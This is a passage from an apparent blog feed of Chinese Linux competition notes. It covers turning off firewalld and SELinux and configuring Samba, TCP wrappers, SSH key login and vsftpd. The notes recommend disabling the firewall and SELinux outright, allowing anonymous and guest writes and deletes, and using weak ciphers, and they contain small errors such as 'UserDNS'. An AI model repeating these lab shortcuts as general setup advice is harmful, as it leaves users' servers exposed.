        <content type="html"><![CDATA[<p><strong>注：</strong> 搭建服务前须关闭防火墙（否则会导致服务无法访问）</p><h2 id="一、firewalld-防火墙"><a href="#一、firewalld-防火墙" class="headerlink" title="一、firewalld 防火墙"></a>一、firewalld 防火墙</h2><p>查看 firewalld 防火墙状态：<code>systemctl status firewalld</code><br>关闭 firewall 防火墙 <code>systemctl stop firewalld</code></p><h2 id="二、SELinux-防火墙"><a href="#二、SELinux-防火墙" class="headerlink" title="二、SELinux 防火墙"></a>二、SELinux 防火墙</h2><p><strong>简介：</strong><br>SELinux(Security-Enhanced Linux) 是美国国家安全局（NSA）对于强制访问控制的实现，是 Linux历史上最杰出的新安全子系统。</p><p><strong>SELinux 分三种模式</strong>：<br>Enforcing（强制模式）、Permissive（警告模式）、Disabled（关闭模式）</p><p>查看防火墙当前状态：<code>getenforce</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  关闭 SELinux 防火墙<br><br>vim /etc/selinux/config#  编辑 selinux 防火墙的配置文件<br><br><br># This file controls the state of SELinux on the system.<br># SELINUX= can take one of these three values:<br>#     enforcing - SELinux security policy is enforced.<br>#     permissive - SELinux prints warnings instead of enforcing.<br>#     disabled - No SELinux policy is loaded.<br>SELINUX=enforcing#  需将此处更改为 disabled（默认为 enforcing）<br># SELINUXTYPE= can take one of three two values:<br>#     targeted - Targeted processes are protected,<br>#     minimum - Modification of targeted policy. Only selected processes are protected. <br>#     mls - Multi Level Security protection.<br></code></pre></td></tr></table></figure><p>更改完后输入命令使其生效 <code>setenforce 0</code></p>]]></content>
      
      
      <categories>
          
          <category> 网络应用竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Samba</title>
      <link href="/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/Samba/Samba/"/>
      <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/Samba/Samba/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>Samba 是在 Linux 和 UNIX 系统上实现 SMB 协议的一种免费软件，由服务器及客户端程序构成。</p><p>SMB 是在局域网上共享文件和打印机的一种通信协议</p><p>默认端口号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">tcp：139、445<br>UDP：137、138<br></code></pre></td></tr></table></figure><h2 id="二、安装及参数介绍"><a href="#二、安装及参数介绍" class="headerlink" title="二、安装及参数介绍"></a>二、安装及参数介绍</h2><p>安装 Samba：<code>yum -y install samba</code><br>默认配置文件路径：<code>/etc/samba/smb.conf</code></p><h3 id="可用变量"><a href="#可用变量" class="headerlink" title="可用变量"></a>可用变量</h3><p>变量名|描述|变量名|描述<br>:-:|:-|:-:|:-|:-<br>%a | 客户机的结构（只支持：Samba、WfWg、WinNT、Win95） | %d | 当前服务进程 ID<br>%I | 客户机的 IP | %P | 当前服务的根目录<br>%L | 服务器的 NETBIOS 名称 | %N | NIS 服务器名<br>%R | 采用的协议等级（值可以是 CORE，COREPLUS，LANMAN1, LANMAN2，NT1） | %S | 当前服务名<br>%T | 当前日期和时间 | %v | Samba 服务的版本号<br>%h | 运行 Samba 服务机器的主机名 | %H | 当前服务的用户的 Home 目录<br>%g | 当前用户所在的主工作组 | %G | 当前对话的用户的主工作组<br>%m | 客户机的 NETBIOS 名称 | %M | 客户机的主机名<br>%u | 当前服务的用户名 | %U | 当前对话的用户名</p><h3 id="smb-conf-配置文件常用参数"><a href="#smb-conf-配置文件常用参数" class="headerlink" title="smb.conf 配置文件常用参数"></a>smb.conf 配置文件常用参数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[global]#  全局配置（默认有该设置，如需要在全局下添加东西则只需在文件中该行的下面添加即可）<br>config file=/etc//samba/%U#  设置配置文件的绝对路径（需要在全局配置下添加）<br><br>[homes]#  用于共享用户目录（默认有该配置）<br><br>[printers]#  用于共享打印机（默认有该配置）<br><br>[test]    #  共享名<br>comment = test-test#  该共享的说明<br>path = /test#  共享文件路径<br><br>#  用户相关<br>browseable = yes#  可浏览<br>public = yes#  允许 guest 账户访问<br>guest ok = yes#  允许 guest 用户访问<br>writeable = yes#  用户可写<br>write list = test-1,test-2#  指定 test-1 用户跟 test-2 用户可写<br>admin users = admin         #  该共享的管理者<br>valid users = test-1,test-2#  设置用户白名单（test-1 与 test-2 用户可访问）<br>invalid users = test-3,test-4#  设置用户黑名单（test-3 与 test-4 用户禁止访问）<br>create mode = 0644#  新建文件后文件的权限<br>directory mode = 0755#  新建文件夹后文件夹的权限<br>veto files = /*root*/*.exe/#  禁止上传 *.exe 的文件跟文件名含有 root 的文件或文件夹<br><br>#  日志相关<br>log file = /var/log/samba/%m.log#  指定日志存放位置<br>max log size =10#  设置日志文件大小（单位为：M）<br><br>#  安全相关<br>encrypt passwords =yes#  密码加密<br>smb passwd file = /etc/samba/smbpasswd#  Samba 用户密码文件存放位置<br>username map = /etc/samba/smbusers      #  Samba 用户文件存放位置<br>security = share#  安全选项（share、user、server、domain）<br>- hare：用户访问 Samba Server 不需要提供用户名和密码<br>- user：Samba Server 共享目录只能被授权的用户访问，由 Samba  Server负责检查账号和密码的正确性<br>- server：依靠其他 Wwindows NT /2000 或 Samba Server 来验证用户名和密码<br>- domain：域安全级别，使用主域控制器（PDC）来完成验证<br><br>#  打印机相关<br>printable = yes         #  打印机是否可打印（默认有该参数）<br>load printers = yes     #  当 Samba 启动时共享打印机<br>printcap name = cups#  设置共享打印机的配置文件<br></code></pre></td></tr></table></figure><h3 id="新建-Samba-用户"><a href="#新建-Samba-用户" class="headerlink" title="新建 Samba 用户"></a>新建 Samba 用户</h3><p>创建 Samba 用户需先建立对应的本地用户 <code>useradd test</code></p><p>新建 test 用户：<code>smbpasswd -a test</code><br>删除 test 用户：<code>smbpasswd -x test</code><br>禁用 test 用户：<code>smbpasswd -d test</code><br>启用 test 用户：<code>smbpasswd -e test</code><br>清除 test 用户密码：<code>smbpasswd -n test</code><br>列出 samba 用户：<code>pdbedit -L</code><br>列出 samba 用户详细：<code>pdbedit -Lv</code></p><h2 id="三、实例"><a href="#三、实例" class="headerlink" title="三、实例"></a>三、实例</h2><p>1、新建用户，并设置共享目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  新建本地用户 test<br>useradd test<br>#  新建 smb 用户 test<br>smbpasswd -a test#  此处需要设置密码<br>#  设置共享目录<br>mkdir /test<br></code></pre></td></tr></table></figure><p>2、编辑配置文件<br>编辑 Samba 配置文件：<code>vim /etc/samba/smb.conf</code><br>在文件内添加如下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[test]#  共享名<br>comment = test#  该共享的描述<br>path = /test#  共享的目录<br>writeable = yes#  允许写入<br></code></pre></td></tr></table></figure><p>3、重启服务<br>编辑完配置文件后重启服务即可<br>停止服务：<code>systemctl stop smb</code><br>启动服务：<code>systemctl start smb</code><br>重启服务：<code>systemctl restart smb</code><br>查看服务状态：<code>systemctl status smb</code></p>]]></content>
      
      
      <categories>
          
          <category> 网络应用竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hosts.allow、Hosts.deny 文件</title>
      <link href="/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/hosts.allow%E6%96%87%E4%BB%B6%E8%B7%9Fhosts.deny%E6%96%87%E4%BB%B6/hosts.allow%E3%80%81hosts.deny/"/>
      <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/hosts.allow%E6%96%87%E4%BB%B6%E8%B7%9Fhosts.deny%E6%96%87%E4%BB%B6/hosts.allow%E3%80%81hosts.deny/</url>
      
        <content type="html"><![CDATA[<p><strong>文件优先级：</strong> <code>先 deny，后 allow，如有冲突则按 allow 文件内的规则处理</code></p><h2 id="hosts-allow-文件"><a href="#hosts-allow-文件" class="headerlink" title="hosts.allow 文件"></a>hosts.allow 文件</h2><p>hosts.allow 文件内的内容为允许服务列表<br>默认路径：<code>/etc/hosts.allow</code><br>格式：<code>服务名 + IP + allow</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sshd:all:allow      #  允许所有主机<br>sshd:192.168.1.:allow       #  允许 1.X 的所有主机<br>sshd:192.168.1.*:allow      #  允许 1.X 的所有主机<br>sshd:192.168.1.0/24:allow   #  允许 1.0 网段的所有主机<br></code></pre></td></tr></table></figure><h2 id="hosts-deny-文件"><a href="#hosts-deny-文件" class="headerlink" title="hosts.deny 文件"></a>hosts.deny 文件</h2><p>hosts.deny 文件内的内容为拒绝服务列表<br>默认路径：<code>/etc/hosts.deny</code><br>格式：<code>服务名 + IP + deny</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sshd:all:deny       #  拒绝所有主机<br>sshd:192.168.1.:deny        #  拒绝 1.X 的所有主机<br>sshd:192.168.1.*:deny       #  拒绝 1.X 的所有主机<br>sshd:192.168.1.0/24:deny    #  拒绝 1.0 网段的所有主机<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络应用竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH</title>
      <link href="/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/ssh/ssh/"/>
      <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/ssh/ssh/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>SSH 是为远程登陆会话和其他网络服务提供安全性的协议</p><p>默认端口号为：<code>22</code><br>客户端配置文件：<code>/etc/ssh/ssh_config</code><br>服务端配置文件：<code>/etc/ssh/sshd_config</code></p><h2 id="二、ssh-config"><a href="#二、ssh-config" class="headerlink" title="二、ssh_config"></a>二、ssh_config</h2><p><code>ssh_config</code> 配置文件常用参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Host *#  有效的主机（多个主机可用空格隔， “*” 表示所有）<br>ForwardAgent no#  连接是否经过代理验证（如果是）转发给远程计算机<br>ForwardX11 no#  连接受否被自动重定向到安全的通道和显示集<br>RhostsRSAAuthentication no#  不使用 RSA 算法基于 rhosts 的安全验证（仅 Version 1 版本使用）<br>RSAAuthentication yes#  使用 RSA 算法进行安全验证<br>PasswordAuthentication yes#  使用口令验证<br>HostbasedAuthentication no#  与 RhostsRSAAuthentication 类似（Version2 使用）。<br>GSSAPIAuthentication no#  是否允许使用基于 GSSAPI 的用户认证（默认值为 ”yes”，仅用于 Version2）<br>BatchMode no#  如为 “yes“，passphrase/password（交互式输入口令）的提示将被禁止<br>CheckHostIP yes#  设置 SSH 是否检查看连接到服务器的主机的 IP 地址以防止 DNS 欺骗（建议设置为 “yes“）<br>AddressFamily any#  指定使用哪种地址协议（默认：any、仅IPv4：IPv4、仅IPv6：IPv6）<br>ConnectTimeout 0#  设置连接超时时间<br>StrictHostKeyChecking ask       #  如果设置为 ”yes“，则不会自动把计算机的密钥加入 ”HOME/.ssh/known_hosts&quot; 文件，并且以一旦计算机的密钥发生了变化，就拒绝连接<br>IdentityFile ~/.ssh/identity#  设置从哪个文件读取用户的 RSA 安全验证标识<br>IdentityFile ~/.ssh/id_rsa<br>IdentityFile ~/.ssh/id_dsa<br>IdentityFile ~/.ssh/id_ecdsa<br>IdentityFile ~/.ssh/id_ed25519<br>Port 22#  设置端口号<br>Protocol 2#  指定 SSH 的协议版本，1 或 2（如需同时支持两者，只需使用逗号分隔，如：1，2）<br>Cipher 3des#  设置加密用的密码<br>Ciphers aes128-ctr,aes192-ctr,aes256-ctr,arcfour256,arcfour128,aes128-cbc,3des-cbc#  指定 Version2 使用的加密算法（多个算法之间使用逗号分隔）<br>MACs hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160#  制定允许在 Version2 中使用哪些消息摘要算法来进行数据校验<br></code></pre></td></tr></table></figure><hr><h2 id="三、sshd-config"><a href="#三、sshd-config" class="headerlink" title="三、sshd_config"></a>三、sshd_config</h2><p><code>sshd_config</code> 配置文件常用参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  常用<br>Port 22#  端口号<br>AddressFamily any#  指定使用哪种地址协议（默认：any、仅IPv4：IPv4、仅IPv6：IPv6）<br>ListenAddress 0.0.0.0#  监听地址（0.0.0.0 表示所有地址）<br>ListenAddress ::#  监听地址（IPv6 地址）<br>Protocol 2#  指定 SSH 的协议版本，1 或 2（如需同时支持两者，只需使用逗号分隔，如：1，2）<br>LogLevel INFO#  日志等级（QUIET, FATAL, ERROR, INFO, VERBOSE, DEBUG, DEBUG1, DEBUG2, and DEBUG3）<br>UserDNS no#  禁止DNS反向解析<br><br>#  用户相关<br>PermitRootLogin no#  禁止root用户登录<br>PermitEmptyPasswords no #  禁止空密码用户登录<br>LoginGraceTime 2m#  登录验证时间为2分钟<br>MaxAuthTries 6#  最大重试次数6次<br>AllowUsers steven#  只允许 steven 用户登录<br>DenyUsers steven#  不允许登录用户 steven<br><br>#  验证<br>PasswordAuthentication yes#  启用密码验证（如配置密钥登录，则需关闭此项）<br>PubkeyAuthentication yes#  启用密匙验证<br>RSAAuthentication yes#  使用 RSA 算法进行安全验证<br>AuthorizedKeysFile      .ssh/authorized_keys#  指定公钥数据库文件（用于密钥登陆）<br></code></pre></td></tr></table></figure><hr><h2 id="四、常用命令"><a href="#四、常用命令" class="headerlink" title="四、常用命令"></a>四、常用命令</h2><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><p>ssh 是 openssh 套件中的客户端连接工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  ssh 常用参数<br>-1#  强制使用 ssh 协议版本1<br>-2#  强制使用 ssh 协议版本2<br>-4#  强制使用 IPV4 地址<br>-6#  强制使用 IPV6 地址<br>-A#  开启认证代理连接转发功能<br>-a#  关闭认证代理连接转发功能<br>-b#  使用本机指定地址作为对应连接的源 IP 地址<br>-C#  请求压缩所有数据<br>-F#  指定 ssh 指令的配置文件<br>-f#  后台执行 ssh 指令<br>-g#  允许远程主机连接主机<br>-i#  指定身份文件<br>-l#  指定连接远程服务器登陆用户名<br>-N#  不执行远程指令<br>-o#  指定配置选项<br>-p#  指定远程服务器的端口<br>-q#  静默模式<br>-X#  开启 X11 转发功能<br>-x#  关闭 X11 转发功能<br>-y#  开启信任 X11 转发功能<br></code></pre></td></tr></table></figure><h3 id="ssh-keygen"><a href="#ssh-keygen" class="headerlink" title="ssh-keygen"></a>ssh-keygen</h3><p>ssh-keygen 命令用于为 ssh 生成、管理和转换认证密钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  ssh-keygene 常用参数<br>-C#  添加注释<br>-b#  指定密钥长度<br>-e#  读取openssh 的私钥或公钥文件<br>-f#  指定用来保存密钥的文件名<br>-i#  读取未加密的 ssh-v2 兼容的私钥/公钥文件，然后在标准输出设备上显示 openssh 见阿荣的私钥/公钥<br>-l#  显示公钥文件的指纹数据<br>-N#  提供一个新密码<br>-P#  提供一个旧密码<br>-q#  静默模式<br>-t#  指定要创建的密钥类型（RSA、DSA，默认为 RSA）<br></code></pre></td></tr></table></figure><h3 id="ssh-cocpy-id"><a href="#ssh-cocpy-id" class="headerlink" title="ssh-cocpy-id"></a>ssh-cocpy-id</h3><p>ssh-copy-id 命令用于把本地主机的公钥复制到远程主机的 &#x2F;root&#x2F;.ssh&#x2F;authorized_keys 文件中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ssh-cocpy-id 常用参数<br>-i#  指定公钥文件<br></code></pre></td></tr></table></figure><h3 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h3><p>加密的方式在本地的主机和远程主机之间复制文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  scp 常用参数<br>-1#  强制使用 ssh 协议版本1<br>-2#  强制使用 ssh 协议版本2<br>-4#  强制使用 IPV4 地址<br>-6#  强制使用 IPV6 地址<br>-B#  以批处理模式运行<br>-C#  使用压缩<br>-F#  指定 ssh 配置文件<br>-i#  identity_file 从指定文件中读取传输时使用的密钥文件<br>-l#  指定宽带限制<br>-o#  指定使用的 ssh 选项<br>-P#  指定远程主机的端口号<br>-p#  保留文件的最后修改时间，最后访问时间和权限模式<br>-q#  不显示复制进度<br>-r#  以递归方式复制<br></code></pre></td></tr></table></figure><hr><h2 id="五、配置密钥登陆"><a href="#五、配置密钥登陆" class="headerlink" title="五、配置密钥登陆"></a>五、配置密钥登陆</h2><h3 id="1、修改配置文件"><a href="#1、修改配置文件" class="headerlink" title="1、修改配置文件"></a>1、修改配置文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  修改服务端配置文件 /etc/ssh/sshd_config<br>PasswordAuthentication no#  关闭密码验证<br>PubkeyAuthentication yes#  启用密钥验证<br>RSAAuthentication yes#  使用 RSA 算法进行安全验证<br></code></pre></td></tr></table></figure><h3 id="2、在客户端生成密钥"><a href="#2、在客户端生成密钥" class="headerlink" title="2、在客户端生成密钥"></a>2、在客户端生成密钥</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ssh-keygen<br>    指定私钥保存的路径及文件名（如不指定则默认为 /root/.ssh/id_rsa）<br>    密钥密码，最少五个字符（用于密钥连接时候使用，如不输入则可免密登陆）<br>    确认密码<br>    确完后自动在密钥文件所在位置创建 .pub 的公钥文件<br><br>#  文件简介<br>id_rsa#  私钥文件<br>id_rsa.pub#  公钥文件<br>authorized_keys#  服务端公钥文件<br>known_hosts#  确认过公钥指纹的可信服务器列表的文件<br>config#  指定不同域名使用哪个密钥的配置文件<br></code></pre></td></tr></table></figure><h3 id="3、上传公钥到服务端"><a href="#3、上传公钥到服务端" class="headerlink" title="3、上传公钥到服务端"></a>3、上传公钥到服务端</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ssh-copy-id -i id_rsa.pub root@192.168.1.123#  将公钥上传到服务器（会自动在服务器 /root/.ssh/ 目录下创建 authorized_keys 文件）<br><br>#  如前一行报错则可用 scp 命令拷贝<br>#  将 .11 主机上的 id_rsa.pub 拷贝到指定目录并更名为 authorized_keys（服务端输入）<br>scp -P 2222 root@10.1.82.11:/root/.ssh/id_rsa.pub /root/.ssh/authorized_keys<br><br>#  或<br>#  将本地主机上的 id_rsa.pub 文件拷贝到 .11 主机上并更名为 authorized_keys（客户端输入）<br>scp -P 2222 /root/.ssh/id_rsa.pub root@10.1.82.12:/root/.ssh/authorized_keys <br></code></pre></td></tr></table></figure><h3 id="4、连接"><a href="#4、连接" class="headerlink" title="4、连接"></a>4、连接</h3><p>如设置了公钥密码则需输入公钥密码，如没设置公钥密码则可免密登陆</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ssh -p 2222 root@192.168.1.123<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络应用竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VSFTP</title>
      <link href="/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/vsftp/vsftp/"/>
      <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/vsftp/vsftp/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>用户以文件操作的方式（如文件的增、删、改、查、传递等）与另一主机互相通信</p><p><code>ftp</code> 有 <code>ASCII</code> 模式与 <code>Binary</code>（二进制） 模式</p><ul><li><code>ASCII</code> 模式用来传递 <code>HTML</code> 和文本编写的文件（如用 <code>Binary</code> 模式传递则会破坏-文件，导致文件执行出错）</li><li><code>Binary</code> 模式用来传递可执行文件，压缩文件，和图片文件（如用 <code>ASCII</code> 模式传递，则会乱码）</li></ul><p>默认端口号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">控制：21<br>传输：20<br></code></pre></td></tr></table></figure><hr><h2 id="二、安装及参数介绍"><a href="#二、安装及参数介绍" class="headerlink" title="二、安装及参数介绍"></a>二、安装及参数介绍</h2><p>安装 vsftp <code>yum -y install vsftpd</code></p><p>默认配置文件 <code>/etc/vsftpd/vsftpd.conf</code></p><p>PAM 认证配置文件路径 <code>/etc/pam.d</code></p><p><code>vsftpd.conf</code> 配置文件常用参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  全局设置<br>listen_port=21#  设置监听端口<br>user_config_dir=/etc/vsftpd/user_conf#  指定用户配置文件目录（配置文件需为对应的用户名）<br>allow_writeable_chroot=yes#  加上此行解决报错（如用户被限定在其主目录下，则该用户不能在有写的权限，否则会报错）<br>#  传输<br>ascii_upload_enable=yes#  启用 ASCII 模式上传数据（配置文件内默认有该参数，但被注释了）<br>ascii_download_enable=yes#  启用 ASCII 模式下载数据（配置文件内默认有该参数，但被注释了）<br>#  被动模式相关（如启用了被动模式，则在客户端使用 ftp 访问时需使用 passive 关闭客户端的被动模式，强制其使用port方式连接。如需开启则再次运行该命令）<br>pasv_enable=yes         #  启用被动模式<br>pasv_promiscuous=yes#  关闭 PASV 模式的安全检查（该检查确保数据连接和控制连接是来自同一 IP）<br>pasv_max_port=4500#  PASV 使用的最大端口<br>pasv_min_port=4000#  PASV 使用的最小端口<br>pasv_address=192.168.1.1#  PASV 模式传输的地址（访问的客户端 IP 跟此处的 IP 不一致时会报错）<br>#  限制<br>max_clients=100#  最大客户端连接数为 100<br>max_per_ip=3#  每个 IP 最大连接数为  3<br>deny_file=&#123;*.exe,&#x27;*root*&#125;#  禁止上传 .exe 的文件和文件名带有 root 的文件<br>chroot_list_enable=yes#  启用限制用户的名单<br>chroot_list_file=/etc/vsftpd/test#  在 test 文件内指定用户列表（泽泻用户作为“例外”，不受限制）<br>chroot_local_user=yes#  所有用户被限制在其主目录下（不能访问除主目录外的其他目录）<br><br>#  匿名用户相关配置<br>anonymous_enable=yes#  允许匿名用户访问（配置文件内默认有该参数）<br>anon_root=/test#  指定匿名用户目录<br>#  匿名用户权限相关<br>anon_upload_enable=yes#  允许匿名用户上传文件（配置文件内默认有该参数，但被注释了）<br>anon_mkdir_write_enable=yes#  允许匿名用户创建目录（配置文件内默认有该参数，但被注释了）<br>anon_world_readable_only=yes#  文件权限中其他用户需有可读的权限，匿名用户才能下载（文件权限分：用户、组、其他用户）<br>anon_umask=022        #  设置匿名用户新建文件的权限为 755（可理解为组跟其他用户不需要 2 权限，或  777 减去 022 ）<br>#  匿名用户限制相关<br>anon_max_rate=30000#  匿名用户限速为 30k/s<br>anon_other_write_enable=yes#  匿名用户拥有删除权限<br><br>#  虚拟用户相关<br>local_root=/test#  指定虚拟用户目录（由于是基于本地用户的，所以需使用此行，文件权限设置为 777）<br>guest_enable=yes#  开启用户身份映射（允许虚拟用户登陆）<br>guest_username=virtftp#  设置映射的用户身份为 virtftp（virtftp 为真实用户）<br>pam_service_name=vsftpd.vu#  